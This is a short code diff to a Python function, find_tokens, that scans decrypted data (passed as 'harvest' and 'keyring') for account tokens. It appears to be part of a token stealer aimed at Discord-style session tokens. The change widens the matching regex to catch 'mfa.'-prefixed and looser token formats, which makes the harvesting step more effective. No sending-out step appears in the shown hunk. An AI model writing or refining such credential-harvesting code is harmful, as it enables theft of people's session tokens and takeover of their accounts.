@@ -695,7 +695,9 @@ def find_tokens(harvest, keyring):
                         continue
             if not plain:
                 continue
-            for token in re.findall(rb"[MN][A-Za-z\d]{23,}\.[\w-]{6,}\.[\w-]{25,}", plain):
+            for token in re.findall(
+                    rb"(?:mfa\.[\w-]{20,}|[A-Za-z\d]{20,}\.[\w-]{6,}\.[\w-]{25,}"
+                    rb"|[A-Za-z\d]{20,}\.[\w-]{20,})", plain):
                 found.append(token.decode())
     return found
 
